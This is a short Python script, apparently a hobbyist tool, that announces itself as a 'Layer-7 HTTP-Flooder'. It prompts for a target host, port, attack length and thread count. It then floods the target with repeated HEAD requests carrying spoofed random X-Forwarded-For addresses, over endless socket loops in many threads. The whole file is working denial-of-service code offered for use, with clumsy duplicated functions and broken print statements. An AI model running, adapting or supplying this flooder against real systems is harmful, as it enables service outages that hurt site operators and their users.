

import socket
import os, sys
import time
import threading, random

print("""
[ - ]====================[ - ]
[ ! ] Layer-7 [HTTP-Flooder]
[ ! ] Coded By NumeX
[ ! ] Made with Love -/
[ - ]====================[ - ]
\n""")
ip = input("[ ? ] Enter IP Target : ")
ip = socket.gethostbyname(ip)
port = int(input("[ ? ] Port : "))
times = int(input("[ ? ] How long you wanna attack : "))
run = int(input("[ ? ] Runner : "))

url = "http://" + str(ip)

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)
  
print('Attacking '.format(ip))
# i Dont Loop it, cuz i scared the tools is overloads lol

def randomop():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)
  
print('Attacking '.format(ip))
# i Dont Loop it, cuz i scared the tools is overloads lol

def randomok():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)
  
print('Attacking '.format(ip))
# i Dont Loop it, cuz i scared the tools is overloads lol

def startAttack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forwardss = "X-Forwarded-For: " + randomok() + "\r\n"
  forwards = "X-Forwarded-For: " + randomip() + "\r\n"
  forward = "X-Forwarded-For: " + randomop() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request1 = get_host + referer + connection + forward + "\r\n\r\n"
  request2 = get_host + referer + connection + forwardss + "\r\n\r\n"
  request = get_host + referer + connection + forwards + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      for y in range(times): # Start attack
          atk.send(str.encode(request))
          atk.send(str.encode(request1))
          atk.send(str.encode(request2))        
    except socket.error:
      pass


if __name__ == "__main__":
	for i in range(run):
              th = threading.Thread(target=startAttack).start()
